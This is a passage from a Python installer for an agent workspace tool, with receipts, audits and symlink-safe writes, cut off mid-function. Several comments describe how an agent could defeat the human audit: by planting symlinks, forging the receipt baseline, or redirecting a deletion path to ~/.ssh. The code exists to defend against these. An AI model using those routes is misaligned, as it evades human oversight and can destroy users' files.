#!/usr/bin/env python3
"""AI-OS Seed installer — the deterministic byte-mover behind AGENT-INSTALL.md.

The agent (or a human) orchestrates and decides; this script is the only
thing that writes install content, so what lands in --target is
byte-identical to this repo, never transcribed by a model.

    install.py --detect                            # read-only: report prior installs on this machine
    install.py --target ~/aios               # copy the substrate in
    install.py --target ~/aios --enable-demo # add hello_fleet to the scheduler manifest
    install.py --target ~/aios --approve claude-md       # apply a staged CLAUDE.md addition
    install.py --target ~/aios --approve mesh-bootstrap  # run memory-mesh/install.sh, recorded
    install.py --target ~/aios --apply-proposal SLUG     # apply an agent-written scheduler repair
    install.py --target ~/aios --revert-proposal SLUG    # undo one, if nothing's touched it since
    install.py --target ~/aios --review-proposals        # read-only: READY / HELD / SOLO per staged proposal
    install.py --target ~/aios --apply-proposals         # apply every READY one; SOLO (settings.json) is deferred
    install.py --target ~/aios --apply-proposal SLUG --confirm TOKEN  # a SOLO one, token printed beside its diff
    install.py --target ~/aios --audit --package <clone> # deterministic post-install auditor
    install.py --target ~/aios --uninstall   # de-schedule managed jobs, then remove the tree

Stdlib only. Refuses to overwrite a non-empty target; uninstall asks the
scheduler to drop its managed jobs before deleting anything, and refuses a
target that doesn't look like one of ours (degrade toward safety).

Wave 2H (SEED-068/069): every install writes a receipt at
<ROOT>/.cc-seed/receipt.json (O_EXCL-created, so an agent can't pre-seed a
fake one) recording a pre-write baseline of anything already at --target and
approval records for the two highest-stakes agent-authored writes. --approve
is the only thing that ever performs those two writes — the agent stages or
shows, a human runs --approve, install.py both records the approval and
moves the bytes. --audit then compares live state against the receipt and
the package's own manifest (never the installed tree) — see
docs/install-audit.md for the full design and its stated residuals.
"""
import argparse
import contextlib
import difflib
import filecmp
import hashlib
import json
import os
import re
import shlex
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

try:
    import fcntl
except ImportError:  # non-POSIX (e.g. native Windows) — degrade to no lock, not a crash
    fcntl = None

HERE = Path(__file__).resolve().parent

# What an install consists of — directories and files copied verbatim.
COMPONENTS = ["_lib", "keyvault", "scheduler", "observability", "demo", "skills", "memory", "memory-mesh", "views",
              "session-brief"]
# Opt-in only (SEED-065): governance/ never ships via the default COMPONENTS
# copy — a default `install.py --target <ROOT>` is byte-for-byte unchanged
# by this wave. --enable-governance is the explicit "governance: none is
# NOT the default, but activation IS" opt-in, run only when the recipient
# says yes in AGENT-INSTALL.md's governance phase.
OPTIONAL_COMPONENTS = ["governance"]
ROOT_FILES = ["PRINCIPLES.md", "PROPOSALS.md", "CLAUDE.md.template", "README.md.template", "VERSION"]
# Components whose EXISTING presence in an --into workspace satisfies the
# requirement instead of colliding (see the compose-mode comment in install()).
SATISFIED_BY_EXISTING = {"memory"}

# Job blocks are the list-item YAML only (no `jobs:` header) — _add_job()
# decides whether that header still needs writing or a job is joining
# others already there.
JOB_HELLO_FLEET = """\
  - name: hello_fleet
    schedule: "*/15 * * * *"
    command: >-
      /usr/bin/python3 {root}/observability/log_run.py --job hello_fleet --
      /usr/bin/python3 {root}/demo/hello_fleet.py
"""

# SEED-070: hello_fleet proves the spine works but gives an operator no
# reason to come back tomorrow — a rival-model review of this backlog named
# that gap directly. repo_hygiene is already shipped (it's freshness.py's
# own dependency check, genericized in SEED-017/manifest.yml) and useful
# from the moment the install root is a git repo, which SEED-002's meta-repo
# pattern guarantees it always is — no history needs to accumulate first,
# unlike views/weekly.py. --root pins the sweep to THIS workspace regardless
# of CC_HYGIENE_ROOT; --findings-exit0 switches it to this seed's own
# found-work-exits-0 convention (scheduler/CONVENTIONS.md rule 1) instead of
# its default exit-1, which stays unchanged for the freshness.py import path.
JOB_REPO_HYGIENE = """\
  - name: repo_hygiene
    schedule: "30 6 * * *"
    command: >-
      /usr/bin/python3 {root}/observability/log_run.py --job repo_hygiene --
      /usr/bin/python3 {root}/observability/repo_hygiene.py --root {root} --findings-exit0
"""

# SEED-074: the backstop that watches every OTHER job was itself unscheduled
# until now — it ran only when a human thought to ask /status, while the
# narrower repo_hygiene sweep was already a default. A monitor nobody runs is
# not monitoring. Scheduled 07:15, after repo_hygiene's 06:30, so the daily
# sweep's own result is already in runs.db when freshness reads it.
# --write-findings is what turns a printed report into one the agent can find
# at session start (see freshness.py's findings_path()).
JOB_FRESHNESS = """\
  - name: freshness
    schedule: "15 7 * * *"
    command: >-
      /usr/bin/python3 {root}/observability/log_run.py --job freshness --
      /usr/bin/python3 {root}/observability/freshness.py --write-findings
"""


# SEED-080 M6: the fold runs on its own systemd/launchd timer, outside the
# scheduler entirely — so nothing in runs.db would ever notice it stopping.
# This job is the outside observer (PRINCIPLES 21): it runs UNDER the
# scheduler, so its own liveness is covered by the freshness backstop, and it
# reports on the fold, the served index, the approved hook wiring and the
# peers. Default-on for the same reason repo_hygiene is: a memory system that
# cannot report its own breakage is worse than none, because it is trusted.
JOB_MESH_WATCH = """\
  - name: mesh_watch
    schedule: "25 * * * *"
    command: >-
      /usr/bin/python3 {root}/observability/log_run.py --job mesh_watch --
      /usr/bin/python3 {root}/memory-mesh/fold_watch.py
"""


def _add_job(manifest: Path, job_name: str, block: str) -> bool:
    """Add one job's YAML block to scheduler/manifest.yml, idempotently.
    Comment-excluded, EXACT line match (not startswith — a job named e.g.
    `repo_hygiene_backup` must not read as `repo_hygiene` already being
    present; the scaffold's own commented examples name real jobs too, so a
    plain substring check reads as already-enabled either way — caught live
    during SEED-017, sharpened to exact-match after the 2026-08-09 review
    found the startswith version's false-positive class). Appends after any
    jobs already present instead of requiring a pristine `jobs: []`, so
    installing the SEED-070 default job first doesn't break a later
    --enable-demo (or vice versa in an --into install where the recipient
    enables the demo before this function ever runs). Atomic write, like
    every other state-changing write in this file — the manifest is exactly
    the kind of file a crash mid-write must never leave truncated, doubly so
    now that SEED-072 hash-binds it as the sole proposal-allowlisted target.
    Returns True if this call freshly added the job, False if it was
    already present (caller decides what, if anything, to print)."""
    text = manifest.read_text()
    marker = f"- name: {job_name}"
    if any(line.strip() == marker
           for line in text.splitlines() if not line.strip().startswith("#")):
        return False
    if "jobs: []" in text:
        new_text = text.replace("jobs: []", "jobs:\n" + block)
    else:
        sep = "" if text.endswith("\n") else "\n"
        new_text = text + sep + block
    _atomic_write(manifest, new_text.encode("utf-8"))
    return True

# --- Wave 2H: receipt / baseline / gated-write constants -------------------
CC_SEED_DIR = ".cc-seed"
RECEIPT_NAME = "receipt.json"
STAGED_DIR = "staged"
GATED_WRITES = {"claude-md", "mesh-bootstrap", "import-pack", "memory-hooks"}
REVOCABLE_WRITES = {"memory-hooks"}
MARKER_START = "<!-- cc-seed:start -->"
MARKER_END = "<!-- cc-seed:end -->"
_MAX_HASH_BYTES = 200 * 1024 * 1024  # Principle 8: bound the loop — don't hash unbounded files

# --- P3 (2026-08-08): cc-pack import — the gated write path -----------------
# A pack (cc-pack/build_pack.py's output, verified by pack/import_pack.py
# which ships alongside this file) is applied entirely OUTSIDE --target's own
# git tree, into an out-of-repo delivery root — see _pack_delivery_root().
# CLAUDE.md gets at most one pointer line, ever, at the very START of the
# file (never the end — the cc-seed claude-md region, when present, must stay
# the LAST thing in the file per check 3's invariant; _approve_claude_md
# already appends after whatever precedes it, so writing the pack pointer
# first and leaving claude-md's own append logic untouched makes the two
# compose regardless of which gated write runs first).
PACKS_MARKER_START = "<!-- cc-pack:start -->"
PACKS_MARKER_END = "<!-- cc-pack:end -->"
# \A/\Z, not ^/$ (2026-08-08 P3 review, GPT): re.match with a trailing $
# accepts a string ending in "\n" (Python's $ matches just before a final
# newline, not only at the true end of string) — "foo\n" would pass this
# check under ^...$ even though it embeds a control character none of the
# OTHER path-safety helpers in this codebase would accept. \A/\Z has no
# such exception.
_PACK_SAFE_COMPONENT_RE = re.compile(r"\A[A-Za-z0-9][A-Za-z0-9._-]*\Z")


def _pack_is_safe_relpath(rel):
    """Declared duplicate of cc-pack/pack_lib.py's is_safe_relpath (same
    split as pack/import_pack.py — this file ships to targets without the
    cc-pack repo). Must run before any path join: Path.__truediv__ silently
    discards the left side when the right is absolute."""
    if not rel or not isinstance(rel, str):
        return False
    if "\x00" in rel or "\\" in rel:
        return False
    if any(ord(c) < 0x20 for c in rel):
        return False
    if rel.startswith("/"):
        return False
    return all(p not in ("", ".", "..") for p in rel.split("/"))


def _pack_is_safe_component(name):
    return isinstance(name, str) and bool(_PACK_SAFE_COMPONENT_RE.match(name))


def die(msg):
    print(f"install.py: {msg}", file=sys.stderr)
    return 2


def looks_like_install(path: Path) -> bool:
    return (path / "PRINCIPLES.md").exists() and (path / "scheduler" / "manifest.yml").exists()


def looks_like_clone(path: Path) -> bool:
    return (path / "install.py").exists() and (path / "AGENT-INSTALL.md").exists()


# Where the log_run.py wrapper path in a scheduled command reveals its install root.
_ROOT_IN_CMD = re.compile(r"(/\S+)/observability/log_run\.py")


def detect():
    """Read-only survey of prior AI-OS Seed (or adjacent AI-OS) footprints on
    this machine, so a fresh install can ask instead of stumble. Always exit 0
    — this reports, it never decides."""
    findings = []

    # 1. The crontab managed block (Linux; harmless empty result elsewhere).
    try:
        r = subprocess.run(["crontab", "-l"], capture_output=True, text=True, timeout=10)
        in_block = False
        for line in r.stdout.splitlines():
            if "BEGIN cc-seed managed jobs" in line:
                in_block = True
                continue
            if "END cc-seed managed jobs" in line:
                in_block = False
                continue
            if in_block and line.strip():
                m = _ROOT_IN_CMD.search(line)
                root = m.group(1) if m else "?"
                name = line.rsplit("# cc-seed:", 1)[-1].strip() if "# cc-seed:" in line else "?"
                findings.append(f"crontab: scheduled job '{name}' -> install root {root}")
    except (OSError, subprocess.TimeoutExpired):
        pass

    # 2. launchd plists (macOS).
    for plist in sorted((Path.home() / "Library" / "LaunchAgents").glob("dev.cc-seed.*.plist")):
        m = _ROOT_IN_CMD.search(plist.read_text(errors="replace"))
        root = m.group(1) if m else "?"
        findings.append(f"launchd: {plist.name} -> install root {root}")

    # 3. Directories a previous install (or AI-OS Core) commonly leaves behind.
    for cand in ["~/aios", "~/ai-os-seed", "~/tools/ai-os-seed", "~/ai-os"]:
        p = Path(cand).expanduser()
        if not p.is_dir():
            continue
        if looks_like_clone(p):
            findings.append(f"dir: {p} — an AI-OS Seed CLONE (repo source, not a live install)")
        elif looks_like_install(p):
            findings.append(f"dir: {p} — an AI-OS Seed INSTALL")
        else:
            findings.append(f"dir: {p} — exists but isn't a seed layout "
                            f"(possibly AI-OS Core or something else of yours — do not touch it)")

    if not findings:
        print("no prior AI-OS Seed footprint detected on this machine.")
        return 0
    print(f"found {len(findings)} prior-install signal(s):")
    for f in findings:
        print(f"  - {f}")
    print("\nOne machine supports ONE live seed install: the scheduler owns a single")
    print("managed crontab block / dev.cc-seed.* label set, and two installs would")
    print("fight over it. See AGENT-INSTALL.md Phase 0 for how to proceed.")
    return 0


# --- Wave 2H: small primitives ---------------------------------------------

def _now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def _sha256_bytes(b: bytes) -> str:
    return "sha256:" + hashlib.sha256(b).hexdigest()


def _sha256_file(p: Path) -> str:
    h = hashlib.sha256()
    with open(p, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return "sha256:" + h.hexdigest()


def _lstat_type(st) -> str:
    if stat.S_ISLNK(st.st_mode):
        return "symlink"
    if stat.S_ISDIR(st.st_mode):
        return "dir"
    if stat.S_ISREG(st.st_mode):
        return "file"
    return "other"


_CONTROL_CHARS = re.compile(r"[\x00-\x1f\x7f-\x9f]")


def _escape_path(s: str) -> str:
    """C0/C1 control characters escaped before hitting a terminal — GPT
    review #17: an unusual filename must not be able to inject a newline and
    forge a fake PASS/FLAGGED line. Ordinary Unicode punctuation (em-dashes
    included — this codebase's own prose style) passes through untouched."""
    return _CONTROL_CHARS.sub(lambda m: m.group(0).encode("unicode_escape").decode("ascii"), s)


def _git_commit(path: Path) -> str:
    try:
        r = subprocess.run(["git", "-C", str(path), "rev-parse", "HEAD"],
                            capture_output=True, text=True, timeout=10)
        return r.stdout.strip() if r.returncode == 0 else "unknown"
    except (OSError, subprocess.TimeoutExpired):
        return "unknown"


def _installer_version() -> str:
    v = HERE / "VERSION"
    return v.read_text().strip() if v.exists() else "unknown"


def _installer_commit() -> str:
    return _git_commit(HERE)


def _atomic_write(path: Path, data: bytes):
    """Write `data` to `path` atomically via a same-directory temp file,
    refusing to write THROUGH a pre-existing symlink at the temp path
    (F3 fix, 2026-08-06 Gemini review): `Path.write_text`/`write_bytes`
    open() with default flags, which follow symlinks — an agent that
    pre-plants `<path>.tmp.<pid>` (or the old fixed `.tmp` sibling) as a
    symlink to an arbitrary file gets that file's *contents* overwritten
    the next time install.py saves, even though the final `os.replace`
    only ever touches the symlink's own directory entry, not its target.
    O_EXCL refuses ANY pre-existing path at the temp name — symlink or
    not — rather than opening through it; a pid-qualified temp name also
    makes the path non-guessable across concurrent installs (defense in
    depth, not the primary fix)."""
    tmp = path.with_name(path.name + f".tmp.{os.getpid()}")
    try:
        fd = os.open(str(tmp), os.O_CREAT | os.O_EXCL | os.O_WRONLY | getattr(os, "O_NOFOLLOW", 0), 0o600)
    except FileExistsError:
        if tmp.is_symlink() or not tmp.is_file():
            raise RuntimeError(f"refusing to write {path} — {tmp} already exists and isn't a "
                                f"plain leftover file install.py can safely remove (possible "
                                f"symlink plant); remove it by hand after confirming what it is")
        tmp.unlink()  # a plain leftover from a crashed prior run — safe to replace, retry once
        fd = os.open(str(tmp), os.O_CREAT | os.O_EXCL | os.O_WRONLY | getattr(os, "O_NOFOLLOW", 0), 0o600)
    with os.fdopen(fd, "wb") as f:
        f.write(data)
    os.replace(tmp, path)


# --- TOCTOU hardening for apply_proposal/revert_proposal (wave2g2 review,
# 2026-08-09, GPT+Gemini independently): the pre-existing code resolved
# `dest = target / rel_target` once via pathlib (which follows symlinks at
# every path component) and then read and wrote through that same path a
# second time later — an agent scoped to --target could swap
# `target/scheduler` for a symlink between those two path-walks and
# redirect the read (information disclosure via the hash-check) or the
# write. `_atomic_write`'s own O_EXCL/O_NOFOLLOW discipline only protects
# the FINAL path component; it does nothing about a symlinked directory
# earlier in the path. The functions below use descriptor-relative
# (openat-style) resolution instead: every directory component between
# `target` and the file is opened relative to its already-verified parent
# fd, refusing with O_NOFOLLOW if that component is anything but a plain
# directory, so there is no window between "checked" and "used" for a
# symlink swap to land in.
def _opendir_nofollow_at(dir_fd: int, name: str) -> int:
    return os.open(name, os.O_RDONLY | os.O_DIRECTORY | getattr(os, "O_NOFOLLOW", 0), dir_fd=dir_fd)


def _resolve_target_dir_fd(target: Path, rel_target: str):
    """Descriptor-relative resolution of every directory component between
    `target` and the final path segment of `rel_target` (e.g. "scheduler"
    for "scheduler/manifest.yml"). Returns (dir_fd, filename); caller must
    os.close(dir_fd) (a `with contextlib.closing(...)`-friendly int, not a
    context manager itself, since callers need it open across a read AND
    a later write)."""
    parts = rel_target.split("/")
    fd = os.open(str(target), os.O_RDONLY | os.O_DIRECTORY)
    try:
        for part in parts[:-1]:
            try:
                nxt = _opendir_nofollow_at(fd, part)
            except OSError as e:
                raise RuntimeError(
                    f"refusing {target}/{rel_target} — a path component ({part!r}) is not "
                    f"a plain directory ({e}); possible symlink swap") from e
            os.close(fd)
            fd = nxt
    except BaseException:
        os.close(fd)
        raise
    return fd, parts[-1]


def _read_bytes_at(dir_fd: int, name: str) -> bytes:
    """Read `name` relative to an already-verified directory fd, refusing
    if `name` itself is a symlink (O_NOFOLLOW). Missing is treated as
    empty, matching the `dest.read_bytes() if dest.exists() else b""`
    behavior this replaces."""
    try:
        fd = os.open(name, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0), dir_fd=dir_fd)
    except FileNotFoundError:
        return b""
    except OSError as e:
        raise RuntimeError(f"refusing to read {name} — {e} (possible symlink)") from e
    with os.fdopen(fd, "rb") as f:
        return f.read()


def _atomic_write_at(dir_fd: int, name: str, data: bytes):
    """Same O_EXCL/O_NOFOLLOW-tempfile-then-rename discipline as
    _atomic_write() above, but every operation is relative to an
    already-verified directory fd instead of a path re-walked from
    scratch, so the write lands in the directory the caller already
    checked, not wherever a symlink swap since then might point."""
    tmp = f"{name}.tmp.{os.getpid()}"
    flags = os.O_CREAT | os.O_EXCL | os.O_WRONLY | getattr(os, "O_NOFOLLOW", 0)
    try:
        fd = os.open(tmp, flags, 0o600, dir_fd=dir_fd)
    except FileExistsError:
        try:
            st = os.stat(tmp, dir_fd=dir_fd, follow_symlinks=False)
        except OSError:
            st = None
        if st is None or not stat.S_ISREG(st.st_mode):
            raise RuntimeError(
                f"refusing to write {name} — {tmp} already exists and isn't a plain "
                f"leftover file (possible symlink plant); remove it by hand after "
                f"confirming what it is")
        os.unlink(tmp, dir_fd=dir_fd)  # plain leftover from a crashed prior run — retry once
        fd = os.open(tmp, flags, 0o600, dir_fd=dir_fd)
    with os.fdopen(fd, "wb") as f:
        f.write(data)
    os.rename(tmp, name, src_dir_fd=dir_fd, dst_dir_fd=dir_fd)


@contextlib.contextmanager
def _proposal_lock(target: Path):
    """Serializes apply_proposal/revert_proposal against each other and
    against a second concurrent install.py invocation, closing the window
    GPT+Gemini also flagged: the hash-check and the write are two
    operations, not one, so something could touch the target between them
    even with the descriptor-relative resolution above (which defends
    against a symlink SWAP, not a plain concurrent EDIT). flock is
    advisory — it cannot stop a process that ignores it — but it makes two
    honest install.py runs safe, which is the actual concurrency this
    tool sees in practice. Degrades to no lock (not a crash) if fcntl is
    unavailable."""
    if fcntl is None:
        yield
        return
    lock_dir = target / CC_SEED_DIR
    lock_dir.mkdir(parents=True, exist_ok=True)
    fd = os.open(str(lock_dir / ".proposal.lock"), os.O_CREAT | os.O_RDWR, 0o600)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        yield
    finally:
        fcntl.flock(fd, fcntl.LOCK_UN)
        os.close(fd)


def _receipt_path(target: Path) -> Path:
    return target / CC_SEED_DIR / RECEIPT_NAME


def _load_receipt(target: Path):
    p = _receipt_path(target)
    if not p.exists():
        return None
    return json.loads(p.read_text())


# --- Wave 2H-2 (F1 fix, 2026-08-06 Gemini review): out-of-target receipt
# anchor. receipt.json lives under --target, so a same-uid agent scoped to
# --target can rewrite a tampered file AND forge a matching baseline entry
# for it, laundering the tamper past --audit check 1 entirely. A mirror
# copy written outside --target on every install.py-performed save gives
# --audit (check 7) something to cross-check the live receipt against that
# a --target-scoped agent can't also rewrite. This raises the bar against
# exactly the threat class this wave defends (a confused or scoped agent);
# it does not defend against a fully compromised same-uid process with
# unrestricted filesystem access — that residual is already disclosed.
def _target_slug(target: Path) -> str:
    # Full digest, not a truncated prefix (2026-08-08 P3 review, GPT: a
    # 16-hex-char/64-bit prefix is an unnecessary collision boundary on a
    # value that scopes both the receipt anchor and the pack delivery root
    # — cheap to widen, no format that depends on the short form exists yet).
    return hashlib.sha256(str(target).encode()).hexdigest()


def _package_sha(package: Path) -> str:
    """One hash over every shipped path and its content in the package this
    install is being made FROM — the identical construction as
    tools/contract_evidence.dist_sha(), so a contract run inside the install
    can name the exact dist/ it is evidence for (2026-09-19: evidence used to
    be bound to dist at RECORD time, so a green run from one build could be
    stamped onto another)."""
    h = hashlib.sha256()
    try:
        for p in sorted(Path(package).rglob("*")):
            if not p.is_file() or "__pycache__" in p.parts:
                continue
            h.update(p.relative_to(package).as_posix().encode())
            h.update(hashlib.sha256(p.read_bytes()).digest())
    except OSError:
        return "unknown"
    return h.hexdigest()


# --- SEED-080 round 2 (R2): what actually RAN, not what the receipt claims ---
# `package_sha` above names the dist/ the install came FROM, and contract_test
# copied it into the evidence as `tested_sha`. That is a CLAIM, not a
# measurement: sabotage <root>/memory-mesh/memory_write.py after the install and
# the contract still reported the clean dist sha, went 14/14 GREEN, and
# contract_evidence recorded and verified it. Reproduced on {{REDACTED}}
# 2026-09-19 — the publish gate was proving the bytes in dist/, never the bytes
# that ran.
#
# INSTALLED_SHA_EXEMPT / installed_sha() are the answer: the SAME algorithm as
# contract_evidence.dist_sha() — sorted relative posix path, then the sha256 of
# each file's bytes — run over the shipped files AS THEY SIT IN THE TARGET.
# Recorded at install time and recomputed live by the contract, so drift
# between them is a measurement, not a story. contract_test.py carries a
# byte-identical copy of installed_sha() (it lives in the installed tree and
# cannot import this file); tools/selftest_installed_sha.py asserts the two
# agree, so the copies cannot drift apart silently.
INSTALLED_SHA_EXEMPT = {
    # --enable-demo legitimately rewrites this file in place, which is why
    # check 1 skips it too. Hashing it would make every post-demo install
    # permanently "drifted".
    "scheduler/manifest.yml",
}


def installed_sha(target: Path, components, root_files) -> str:
    """One hash over every shipped file as it exists in the TARGET."""
    h = hashlib.sha256()
    paths = []
    for comp in components:
        base = Path(target) / comp
        if not base.is_dir():
            continue
        paths.extend(p for p in base.rglob("*") if p.is_file())
    for f in root_files:
        p = Path(target) / f
        if p.is_file():
            paths.append(p)
    for p in sorted(paths):
        rel = p.relative_to(Path(target)).as_posix()
        if "__pycache__" in p.parts or rel in INSTALLED_SHA_EXEMPT:
            continue
        h.update(rel.encode())
        h.update(hashlib.sha256(p.read_bytes()).digest())
    return h.hexdigest()


def _refresh_installer(target: Path, new_tree: Path) -> bool:
    """Replace the target's own install.py with the fetched tree's.

    install.py is not a SHIPPED path, so --update never touched it: every
    install kept the installer it was born with, forever. {{REDACTED}} was found
    running the 0.3.8 installer after updating to 0.4.2 (2026-09-19) — its
    default jobs, its receipt fields and its skill-shadowing behaviour were
    all three versions stale, and no verb could move it. Replacing the file
    mid-run is safe: Python has already read and compiled this module, and
    the write is atomic, so the running process keeps its own bytes.
    """
    src = new_tree / "install.py"
    dst = target / "install.py"
    # ONLY refresh one that is already there. A fresh install does NOT place
    # install.py in the target — the operator runs it from wherever they
    # downloaded it — so creating one here would add a path the package audit
    # rightly reports as unexpected (caught by selftest_skill_origin, which
    # went FLAGGED the moment this wrote a file install() never writes).
    if not src.is_file() or not dst.is_file():
        return False
    body = src.read_bytes()
    if dst.read_bytes() == body:
        return False
    tmp = dst.with_suffix(".py.tmp")
    tmp.write_bytes(body)
    tmp.chmod(0o755)
    tmp.replace(dst)
    print(f"refreshed the installer itself: {dst}")
    return True


def _record_installed_sha(target: Path, receipt: dict) -> str:
    sha = installed_sha(target, receipt["install"].get("components", []), ROOT_FILES)
    receipt["install"]["installed_sha"] = sha
    return sha


def _anchor_path(target: Path) -> Path:
    return Path.home() / ".cache" / "cc-seed" / "receipt-anchors" / f"{_target_slug(target)}.json"


def _pack_delivery_root(target: Path) -> Path:
    """P3: where imported-pack content actually lands — out-of-repo, on
    purpose (see the GATED_WRITES comment above). Same slug construction as
    _anchor_path, factored into _target_slug per the design doc's own
    instruction, so the two locations can never drift onto different slugs
    for the same target."""
    xdg_state = os.environ.get("XDG_STATE_HOME") or str(Path.home() / ".local" / "state")
    return Path(xdg_state) / "cc-pack" / _target_slug(target)


def _expected_pack_dest(target: Path, pack_id: str) -> Path:
    """The ONLY trustworthy delivery-root path for a given pack id — always
    RE-DERIVED, never read from receipt.json's `delivery_path` field for any
    operation that deletes or otherwise trusts filesystem content (2026-08-08
    P3 tri-model review, consensus CRITICAL finding, all three reviewers
    independently: a same-uid agent scoped to --target can edit the live
    receipt — that's the entire reason the out-of-target anchor/check 7
    exist — and `remove_pack`/check 9 read `delivery_path` straight off that
    same untrusted receipt and used it for `shutil.rmtree()` / hashing. An
    agent could set `delivery_path` to `~/.ssh` and have a human's later
    `--remove-pack` delete it. `delivery_path` in the receipt is now
    DISPLAY/PROVENANCE ONLY — every filesystem operation uses this function."""
    if not _pack_is_safe_component(pack_id):
        raise ValueError(f"pack id {pack_id!r} is not a safe path component")
    return _pack_delivery_root(target) / "packs" / pack_id


def _save_anchor(target: Path, receipt: dict):
    """Best-effort — a failure here must never block the real receipt write
    (degrade toward safety: --audit's check 7 reports SKIPPED, not ERROR,
    when no anchor is found)."""
    try:
        anchor = _anchor_path(target)
        anchor.parent.mkdir(parents=True, exist_ok=True)
        _atomic_write(anchor, (json.dumps(receipt, indent=2, sort_keys=True) + "\n").encode())
    except (OSError, RuntimeError) as e:
        print(f"WARNING: could not write the receipt anchor ({e}) — --audit's "
              f"check 7 (receipt integrity) will be degraded for this install",
              file=sys.stderr)


def _load_anchor(target: Path):
    p = _anchor_path(target)
    if not p.exists():
        return None
    try:
        return json.loads(p.read_text())
    except (json.JSONDecodeError, OSError):
        return None


def _save_receipt(target: Path, receipt: dict):
    p = _receipt_path(target)
    _atomic_write(p, (json.dumps(receipt, indent=2, sort_keys=True) + "\n").encode())
    _save_anchor(target, receipt)


def _init_receipt(target: Path, mode: str) -> dict:
    """Create the receipt with O_EXCL — refuses if one already exists (an
    agent can't silently pre-seed a fake baseline, and a stale receipt from a
    prior partial attempt is surfaced rather than silently overwritten)."""
    d = target / CC_SEED_DIR
    d.mkdir(parents=True, exist_ok=True)
    p = d / RECEIPT_NAME
    fd = os.open(str(p), os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
    os.close(fd)
    receipt = {
        # 2 (2026-09-19, SEED-080 bug bash). What changed:
        #   install.refused_skills[]        — a skill the origin rule REFUSED
        #   gated_writes.memory-hooks.entries        — now ONLY what was added
        #   gated_writes.memory-hooks.already_present — what was already wired
        #   gated_writes.memory-hooks.adopted        — wired before we arrived
        #   gated_writes.memory-hooks.prior_bytes_len — replaces prior_bytes,
        #       which copied the user's whole settings.json (API key and all)
        #       into the receipt AND the out-of-target anchor
        #   install.package_sha              — the dist the install came from
        # Nothing READS `schema`, and every reader of the fields above uses
        # .get() with a default, so a schema-1 receipt keeps working: a
        # missing refused_skills is no refusals, a missing prior_bytes_len is
        # simply not reported, and prior_bytes on an old receipt is left alone
        # rather than rewritten (an uninstall removes it with the receipt).
        # Migration note: docs/install-audit.md.
        "schema": 2,
        "install": {
            "target": str(target), "mode": mode,
            "installer_version": _installer_version(), "installer_commit": _installer_commit(),
            "package_sha": _package_sha(HERE),
            "components": [], "skipped": [], "at": _now(),
        },
        "baseline": {},
        "gated_writes": {},
    }
    _save_receipt(target, receipt)
    return receipt


def _capture_baseline(target: Path, receipt: dict):
    """Full lstat-based inventory of every path already under target, taken
    as step one after the receipt exists and before any component is
    written. Symlinks are recorded via lstat, never followed; regular files
    get a content hash (skipped past _MAX_HASH_BYTES — bound the loop, not
    the coverage: still enumerated, just not read)."""
    baseline = {}
    for p in sorted(target.rglob("*")):
        rel = p.relative_to(target).as_posix()
        if rel == CC_SEED_DIR or rel.startswith(CC_SEED_DIR + "/"):
            continue  # install.py's own scaffold, not pre-existing user content
        st = p.lstat()
        entry = {"type": _lstat_type(st), "mode": oct(stat.S_IMODE(st.st_mode))}
        if entry["type"] == "symlink":
            entry["symlink_target"] = os.readlink(p)
        elif entry["type"] == "file":
            entry["size"] = st.st_size
            if st.st_size <= _MAX_HASH_BYTES:
                entry["hash"] = _sha256_file(p)
            else:
                entry["hash"] = None
                print(f"WARNING: {rel} is {st.st_size} bytes — too large to hash for the "
                      f"install baseline; --audit check 1 cannot verify this path's content",
                      file=sys.stderr)
        baseline[rel] = entry
    receipt["baseline"] = baseline


def install(target: Path, into: bool = False):
    skipped = []
    if target.exists() and any(target.iterdir()):
        if looks_like_clone(target):
            return die(f"target {target} is the seed REPO CLONE, not an install "
                       f"root — install into a separate directory (the clone is "
                       f"the source you install FROM).")
        if looks_like_install(target):
            return die(f"target {target} is already an AI-OS Seed install. To keep "
                       f"it, stop here (nothing to do). To replace it, run "
                       f"--uninstall on it first, then install fresh.")
        if not into:
            return die(f"target {target} exists and is not empty. If it's YOUR "
                       f"agent's existing workspace and you want the seed to move "
                       f"in alongside your content, re-run with --into. Otherwise "
                       f"pick an empty/new directory.")
        # Compose mode: the seed joins an existing workspace. Same covenant,
        # applied per-name instead of per-tree — every component and root file
        # the seed would write must be ABSENT; everything else in the
        # workspace is the user's and is never touched. No partial merges: one
        # collision refuses the whole install, loudly, before any byte moves.
        #
        # One exception, learned on a real machine: memory/. The seed's
        # memory component is an EMPTY scaffold for a discipline; a workspace
        # that already has memory/ (every AI-OS Core does — it's the user's
        # live, cwd-keyed brain) already practices it. Existing memory
        # SATISFIES the requirement, so it's skipped whole — nothing is
        # written into it, not even the conventions doc. Functional
        # components get no such pass: a colliding scheduler/ or _lib/ holds
        # the user's bytes, not the seed's, and skipping one would produce an
        # install that only thinks it's complete.
        skipped = [c for c in SATISFIED_BY_EXISTING if (target / c).is_dir()]
        collisions = [c for c in COMPONENTS + ROOT_FILES
                      if (target / c).exists() and c not in skipped]
        # SEED-071: .claude/skills/<name> isn't a COMPONENTS entry (skills/
        # is), so it needs its own pre-check here — same no-partial-merges
        # guarantee, checked before target.mkdir()/any copytree below rather
        # than discovered mid-registration after skills/ already landed.
        if "skills" not in skipped:
            # exists() OR is_symlink() — a dangling symlink left by a prior
            # partial install/uninstall reads exists()==False but must still
            # collide, matching _register_skills()'s own backstop predicate
            # (2026-08-09 review: the two had drifted, which meant a dangling
            # link passed this check only to trip the assert AFTER skills/
            # was already copied).
            skill_collisions = []
            for n in _shipped_skill_names():
                p = target / ".claude" / "skills" / n / "SKILL.md"
                if p.exists() or p.is_symlink():
                    skill_collisions.append(f".claude/skills/{n}")
            collisions += skill_collisions
        if collisions:
            return die(f"--into {target}: these names already exist there: "
                       f"{', '.join(collisions)}. Refusing to merge or overwrite "
                       f"— rename what's yours or pick a fresh directory.")
        for c in skipped:
            print(f"{c}/ already exists — yours satisfies the requirement; "
                  f"the seed's empty scaffold is not written.")
    elif into:
        return die(f"--into expects an existing, non-empty workspace at {target} "
                   f"— for a fresh directory just use --target without --into.")
    missing = [c for c in COMPONENTS + ROOT_FILES if not (HERE / c).exists()]
    if missing:
